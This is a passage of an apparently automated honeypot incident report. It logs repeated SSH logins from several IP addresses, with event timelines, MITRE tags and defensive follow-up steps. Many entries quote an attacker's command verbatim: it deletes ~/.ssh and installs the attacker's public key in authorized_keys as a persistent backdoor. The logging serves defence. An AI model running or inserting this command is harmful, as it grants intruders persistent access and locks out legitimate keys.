| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:21:01` | `cowrie.session.connect` |
| `2026-06-02 21:21:01` | `cowrie.client.version` |
| `2026-06-02 21:21:01` | `cowrie.client.kex` |
| `2026-06-02 21:21:01` | `cowrie.login.success` |
| `2026-06-02 21:21:02` | `cowrie.session.params` |
| `2026-06-02 21:21:02` | `cowrie.command.input` |
| `2026-06-02 21:21:02` | `cowrie.command.failed` |
| `2026-06-02 21:21:02` | `cowrie.log.closed` |
| `2026-06-02 21:21:02` | `cowrie.session.params` |
| `2026-06-02 21:21:02` | `cowrie.command.input` |
| `2026-06-02 21:21:02` | `cowrie.session.file_download` |
| `2026-06-02 21:21:02` | `cowrie.log.closed` |
| `2026-06-02 21:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1664e8217fc7

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:21 |
| **Last Seen** | 2026-06-02 21:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:21:04` | `cowrie.session.connect` |
| `2026-06-02 21:21:04` | `cowrie.client.version` |
| `2026-06-02 21:21:04` | `cowrie.client.kex` |
| `2026-06-02 21:21:04` | `cowrie.login.success` |
| `2026-06-02 21:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dea6f71dc16

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 21:21 |
| **Last Seen** | 2026-06-02 21:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:21:21` | `cowrie.session.connect` |
| `2026-06-02 21:21:21` | `cowrie.client.version` |
| `2026-06-02 21:21:21` | `cowrie.client.kex` |
| `2026-06-02 21:21:22` | `cowrie.login.success` |
| `2026-06-02 21:21:22` | `cowrie.session.params` |
| `2026-06-02 21:21:22` | `cowrie.command.input` |
| `2026-06-02 21:21:22` | `cowrie.command.failed` |
| `2026-06-02 21:21:22` | `cowrie.log.closed` |
| `2026-06-02 21:21:22` | `cowrie.session.params` |
| `2026-06-02 21:21:22` | `cowrie.command.input` |
| `2026-06-02 21:21:23` | `cowrie.session.file_download` |
| `2026-06-02 21:21:23` | `cowrie.log.closed` |
| `2026-06-02 21:21:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-187074cc74f7

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 21:21 |
| **Last Seen** | 2026-06-02 21:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:21:25` | `cowrie.session.connect` |
| `2026-06-02 21:21:25` | `cowrie.client.version` |
| `2026-06-02 21:21:25` | `cowrie.client.kex` |
| `2026-06-02 21:21:25` | `cowrie.login.success` |
| `2026-06-02 21:21:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-496e4ee6001c

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:22 |
| **Last Seen** | 2026-06-02 21:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:22:50` | `cowrie.session.connect` |
| `2026-06-02 21:22:50` | `cowrie.client.version` |
| `2026-06-02 21:22:51` | `cowrie.client.kex` |
| `2026-06-02 21:22:52` | `cowrie.login.success` |
| `2026-06-02 21:22:53` | `cowrie.session.params` |
| `2026-06-02 21:22:53` | `cowrie.command.input` |
| `2026-06-02 21:22:53` | `cowrie.command.failed` |
| `2026-06-02 21:22:53` | `cowrie.log.closed` |
| `2026-06-02 21:22:54` | `cowrie.session.params` |
| `2026-06-02 21:22:54` | `cowrie.command.input` |
| `2026-06-02 21:22:54` | `cowrie.session.file_download` |
| `2026-06-02 21:22:54` | `cowrie.log.closed` |
| `2026-06-02 21:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cea2439f222b

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:22 |
| **Last Seen** | 2026-06-02 21:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:22:58` | `cowrie.session.connect` |
| `2026-06-02 21:22:58` | `cowrie.client.version` |
| `2026-06-02 21:22:58` | `cowrie.client.kex` |
| `2026-06-02 21:22:59` | `cowrie.login.success` |
| `2026-06-02 21:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20570102cc6b

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:23 |
| **Last Seen** | 2026-06-02 21:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:23:04` | `cowrie.session.connect` |
| `2026-06-02 21:23:04` | `cowrie.client.version` |
| `2026-06-02 21:23:04` | `cowrie.client.kex` |
| `2026-06-02 21:23:04` | `cowrie.login.success` |
| `2026-06-02 21:23:05` | `cowrie.session.params` |
| `2026-06-02 21:23:05` | `cowrie.command.input` |
| `2026-06-02 21:23:05` | `cowrie.command.failed` |
| `2026-06-02 21:23:05` | `cowrie.log.closed` |
| `2026-06-02 21:23:05` | `cowrie.session.params` |
| `2026-06-02 21:23:05` | `cowrie.command.input` |
| `2026-06-02 21:23:05` | `cowrie.session.file_download` |
| `2026-06-02 21:23:05` | `cowrie.log.closed` |
| `2026-06-02 21:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ca8c2cc317e

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:23 |
| **Last Seen** | 2026-06-02 21:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:23:07` | `cowrie.session.connect` |
| `2026-06-02 21:23:07` | `cowrie.client.version` |
| `2026-06-02 21:23:07` | `cowrie.client.kex` |
| `2026-06-02 21:23:07` | `cowrie.login.success` |
| `2026-06-02 21:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be3b16d97d98

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 21:23 |
| **Last Seen** | 2026-06-02 21:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:23:13` | `cowrie.session.connect` |
| `2026-06-02 21:23:13` | `cowrie.client.version` |
| `2026-06-02 21:23:13` | `cowrie.client.kex` |
| `2026-06-02 21:23:14` | `cowrie.login.success` |
| `2026-06-02 21:23:14` | `cowrie.session.params` |
| `2026-06-02 21:23:14` | `cowrie.command.input` |
| `2026-06-02 21:23:14` | `cowrie.command.failed` |
| `2026-06-02 21:23:14` | `cowrie.log.closed` |
| `2026-06-02 21:23:15` | `cowrie.session.params` |
| `2026-06-02 21:23:15` | `cowrie.command.input` |
| `2026-06-02 21:23:15` | `cowrie.session.file_download` |
| `2026-06-02 21:23:15` | `cowrie.log.closed` |
| `2026-06-02 21:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b75ef7a3f39

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 21:23 |
| **Last Seen** | 2026-06-02 21:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:23:17` | `cowrie.session.connect` |
| `2026-06-02 21:23:17` | `cowrie.client.version` |
| `2026-06-02 21:23:17` | `cowrie.client.kex` |
| `2026-06-02 21:23:18` | `cowrie.login.success` |
| `2026-06-02 21:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f037fb712a05

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:25 |
| **Last Seen** | 2026-06-02 21:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:25:08` | `cowrie.session.connect` |
| `2026-06-02 21:25:08` | `cowrie.client.version` |
| `2026-06-02 21:25:08` | `cowrie.client.kex` |
| `2026-06-02 21:25:09` | `cowrie.login.success` |
| `2026-06-02 21:25:09` | `cowrie.session.params` |
| `2026-06-02 21:25:09` | `cowrie.command.input` |
| `2026-06-02 21:25:09` | `cowrie.command.failed` |
| `2026-06-02 21:25:09` | `cowrie.log.closed` |
| `2026-06-02 21:25:09` | `cowrie.session.params` |
| `2026-06-02 21:25:09` | `cowrie.command.input` |
| `2026-06-02 21:25:09` | `cowrie.session.file_download` |
| `2026-06-02 21:25:09` | `cowrie.log.closed` |
| `2026-06-02 21:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86c99b7e1aba

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:25 |
| **Last Seen** | 2026-06-02 21:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:25:11` | `cowrie.session.connect` |
| `2026-06-02 21:25:11` | `cowrie.client.version` |
| `2026-06-02 21:25:11` | `cowrie.client.kex` |
| `2026-06-02 21:25:12` | `cowrie.login.success` |
| `2026-06-02 21:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98ea10442f5f

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:25 |
| **Last Seen** | 2026-06-02 21:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:25:12` | `cowrie.session.connect` |
| `2026-06-02 21:25:12` | `cowrie.client.version` |
| `2026-06-02 21:25:12` | `cowrie.client.kex` |
| `2026-06-02 21:25:14` | `cowrie.login.success` |
| `2026-06-02 21:25:14` | `cowrie.session.params` |
| `2026-06-02 21:25:14` | `cowrie.command.input` |
| `2026-06-02 21:25:14` | `cowrie.command.failed` |
| `2026-06-02 21:25:15` | `cowrie.log.closed` |
| `2026-06-02 21:25:15` | `cowrie.session.params` |
| `2026-06-02 21:25:15` | `cowrie.command.input` |
| `2026-06-02 21:25:16` | `cowrie.session.file_download` |
| `2026-06-02 21:25:16` | `cowrie.log.closed` |
| `2026-06-02 21:25:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d2fe6d108fe

| Field | Detail |
|---|---|
| **Source IP** | `118.186.18[.]243` |
| **First Seen** | 2026-06-02 21:25 |
| **Last Seen** | 2026-06-02 21:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:25:13` | `cowrie.session.connect` |
| `2026-06-02 21:25:13` | `cowrie.client.version` |
| `2026-06-02 21:25:13` | `cowrie.client.kex` |
| `2026-06-02 21:25:14` | `cowrie.login.success` |
| `2026-06-02 21:25:14` | `cowrie.session.params` |
| `2026-06-02 21:25:14` | `cowrie.command.input` |
| `2026-06-02 21:25:14` | `cowrie.command.failed` |
| `2026-06-02 21:25:14` | `cowrie.log.closed` |
| `2026-06-02 21:25:15` | `cowrie.session.params` |
| `2026-06-02 21:25:15` | `cowrie.command.input` |
| `2026-06-02 21:25:15` | `cowrie.session.file_download` |
| `2026-06-02 21:25:15` | `cowrie.log.closed` |
| `2026-06-02 21:25:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.18[.]243` to AbuseIPDB if not already reported
- [ ] Block `118.186.18[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5a0b917463d

| Field | Detail |
|---|---|
| **Source IP** | `118.186.18[.]243` |
| **First Seen** | 2026-06-02 21:25 |
| **Last Seen** | 2026-06-02 21:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:25:17` | `cowrie.session.connect` |
| `2026-06-02 21:25:17` | `cowrie.client.version` |
| `2026-06-02 21:25:17` | `cowrie.client.kex` |
| `2026-06-02 21:25:18` | `cowrie.login.success` |
| `2026-06-02 21:25:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.18[.]243` to AbuseIPDB if not already reported
- [ ] Block `118.186.18[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb5156c212f4

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:25 |
| **Last Seen** | 2026-06-02 21:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:25:19` | `cowrie.session.connect` |
| `2026-06-02 21:25:19` | `cowrie.client.version` |
| `2026-06-02 21:25:20` | `cowrie.client.kex` |
| `2026-06-02 21:25:21` | `cowrie.login.success` |
| `2026-06-02 21:25:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a960baf2fe

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:27 |
| **Last Seen** | 2026-06-02 21:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:27:09` | `cowrie.session.connect` |
| `2026-06-02 21:27:09` | `cowrie.client.version` |
| `2026-06-02 21:27:09` | `cowrie.client.kex` |
| `2026-06-02 21:27:10` | `cowrie.login.success` |
| `2026-06-02 21:27:10` | `cowrie.session.params` |
| `2026-06-02 21:27:10` | `cowrie.command.input` |
